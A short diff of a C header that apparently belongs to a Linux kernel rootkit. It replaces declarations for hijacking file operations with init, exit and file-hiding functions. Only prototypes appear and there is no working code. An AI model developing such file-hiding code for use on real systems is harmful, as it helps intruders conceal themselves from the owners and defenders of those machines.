@@ -4,7 +4,10 @@
 
 #include <linux/string.h>
 
-void satan_hijack_f_op(const char *path);
-void satan_unhijack_f_op(const char *path);
+int satan_file_init(void);
+int satan_file_exit(void);
+
+int satan_file_hide(const char *path);
+int satan_file_unhide(const char *path);
 
 #endif  // SATAN_FILE_H_
